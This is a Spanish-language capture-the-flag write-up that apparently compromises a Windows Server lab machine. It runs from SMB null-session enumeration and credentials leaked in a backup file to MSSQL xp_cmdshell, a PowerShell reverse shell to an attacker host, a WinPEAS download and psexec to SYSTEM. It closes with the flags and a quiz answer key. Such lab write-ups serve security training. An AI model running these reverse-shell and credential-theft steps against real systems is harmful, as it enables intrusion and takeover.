## 1. Reconocimiento Inicial

```Bash
ping -c 4 <IP>
```

Realizamos un escaneo para enumerar los servicios expuestos

```Bash
nmap -sC -sV -p- <IP>
```

**Servicios Identificados:**

|**PUERTO**|**SERVICIO**|**VERSIÓN**|
|---|---|---|
|135/tcp|msrpc|Microsoft Windows RPC|
|139/tcp|netbios-ssn|Microsoft Windows netbios-ssn|
|445/tcp|microsoft-ds|Windows Server 2019 Standard 17763 microsoft-ds|
|1433/tcp|ms-sql-s|Microsoft SQL Server 2017 14.00.1000.00; RTM|
|5985/tcp|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|

**Análisis de los resultados:**

Los scripts de `nmap` revelan que el sistema operativo es un **Windows Server 2019 Standard**. Además, observamos que la firma de mensajes SMB está habilitada pero no es requerida, lo que hace al equipo potencialmente vulnerable a ataques de _SMB Relay_. Sin embargo, Al tratarse de un Windows Server 2019, la máquina **no** es vulnerable a EternalBlue (MS17-010).

## 2. Enumeración de Servicios (SMB)

Dado que los puertos 139 y 445 están abiertos, procedemos a enumerar el servicio SMB en busca de sesiones nulas (_Null Sessions_) utilizando la herramienta `nxc` (NetExec).

### 2.1. Enumeración de Usuarios y Recursos Compartidos

Primero, intentamos listar usuarios autenticándonos sin credenciales (sesión nula):

```
nxc smb <IP> -u '' -p '' --users
```

_Resultado:_ El sistema nos permite la conexión anónima y revela la cuenta de invitado (`Guest`).

Seguidamente, verificamos a qué recursos compartidos (shares) tenemos acceso:

```
nxc smb <IP> -u 'a' -p '' --shares
```

La salida nos muestra los siguientes recursos compartidos:

- `ADMIN$` (Remote Admin)
- `backups` (READ)
- `C$` (Default share)
- `IPC$` (Remote IPC - READ)

### 2.2. Acceso a Archivos Sensibles

El recurso `backups` tiene permisos de lectura. Utilizamos `smbclient` para acceder a él:

```
smbclient -N \\\\<IP>\\backups
```

Dentro del directorio, encontramos un archivo de configuración de SQL Server Integration Services (SSIS).

![[Pasted image 20260715135221.png]]

Descargamos el archivo a nuestra máquina local utilizando el comando `get prod.dtsConfig`. Al inspeccionar su contenido, descubrimos credenciales de base de datos en texto claro:

![[Pasted image 20260715163719.png]]

- **Usuario:** `ARCHETYPE\sql_svc`
- **Contraseña:** `M3g4c0rp123`

## 3. Explotación (MSSQL a RCE)

Con las credenciales obtenidas, nos conectamos al servicio MSSQL (puerto 1433) utilizando el script `mssqlclient.py` de la suite Impacket. Al ser una cuenta de dominio de Windows, especificamos el flag `-windows-auth`.

```Bash
python3 mssqlclient.py ARCHETYPE/sql_svc@<IP> -windows-auth
```

### 3.1. Habilitación de ejecución de comandos

Una vez autenticados, comprobamos si nuestro usuario tiene privilegios de administrador en la base de datos (`sysadmin`):

```SQL
SELECT is_srvrolemember('sysadmin');
```

El servidor devuelve un `1`, confirmando que tenemos máximos privilegios. Procedemos a habilitar el procedimiento almacenado `xp_cmdshell` para ejecutar comandos a nivel de sistema operativo:

```SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Podemos verificar la ejecución de comandos enviando: `xp_cmdshell "whoami"`.

### 3.2. Obtención de una Reverse Shell

Para obtener una sesión interactiva, generamos un payload de PowerShell codificado en base64 (utilizando un script o generador) que apunte a nuestra máquina atacante (`10.10.30.6` en el puerto `4444`).

Nos ponemos a la escucha en nuestra máquina Kali:

```Bash
rlwrap nc -lvnp 4444
```

Desde la consola de MSSQL, ejecutamos el payload:

```SQL
SQL> xp_cmdshell 'powershell -exec bypass -enc CgAkA...'
```

Recibimos la conexión y obtenemos acceso como el usuario de servicio. Leemos la primera bandera:

```PowerShell
cat C:\Users\sql_svc\Desktop\user.txt
# 3e7b102e78218e935bf3f4951fec21a3
```

## 4. Escalada de Privilegios

El objetivo ahora es escalar privilegios hacia `NT AUTHORITY\SYSTEM` o el usuario `Administrator`.

### 4.1. Enumeración Interna con WinPEAS

En nuestra máquina Kali, levantamos un servidor HTTP:

```Bash
python3 -m http.server 80
```

En la máquina víctima, utilizamos PowerShell (`wget` es un alias de `Invoke-WebRequest` en PowerShell) para transferir el binario:

```PowerShell
wget http://<IP_Kali>/winPEASx64.exe -OutFile winPEASx64.exe
.\winPEASx64.exe
```

### 4.2. Recuperación de Historial de PowerShell

Durante el análisis, WinPEAS resalta un archivo interesante correspondiente al historial de comandos de PowerShell:

`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Revisamos su contenido:

```PowerShell
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

_Salida:_
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Descubrimos que un administrador mapeó una unidad de red introduciendo sus credenciales en texto claro por consola:

- **Usuario:** `Administrator`
- **Contraseña:** `MEGACORP_4dm1n!!`

### 4.3. Acceso Total (SYSTEM)

Con credenciales válidas de administrador, utilizamos `psexec.py` (Impacket) de forma remota para autenticarnos y obtener directamente una shell interactiva como `NT AUTHORITY\SYSTEM`.

```Bash
python3 psexec.py administrator:'MEGACORP_4dm1n!!'@<IP>
```

Verificamos nuestra identidad y procedemos a leer la flag de _root_:

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

---

>[!Question]- ¿Qué puerto TCP aloja un servidor de base de datos?
>1433

>[!Question]- ¿Cuál es el nombre del recurso compartido no administrativo disponible a través de SMB?
>backups

>[!Question]- ¿Cuál es la contraseña que aparece en el archivo del recurso compartido SMB?
>M3g4c0rp123

>[!Question]- ¿Qué script de la colección Impacket se puede utilizar para establecer una conexión autenticada con un servidor Microsoft SQL Server?
>mssqlclient.py

>[!Question]- ¿Qué procedimiento almacenado extendido de Microsoft SQL Server se puede utilizar para iniciar una consola de comandos de Windows?
>xp_cmdshell

>[!Question]- ¿Qué script se puede utilizar para buscar posibles rutas para escalar privilegios en hosts de Windows?
>winpeas

>[!Question]- ¿Qué archivo contiene la contraseña del administrador?
>ConsoleHost_history.txt

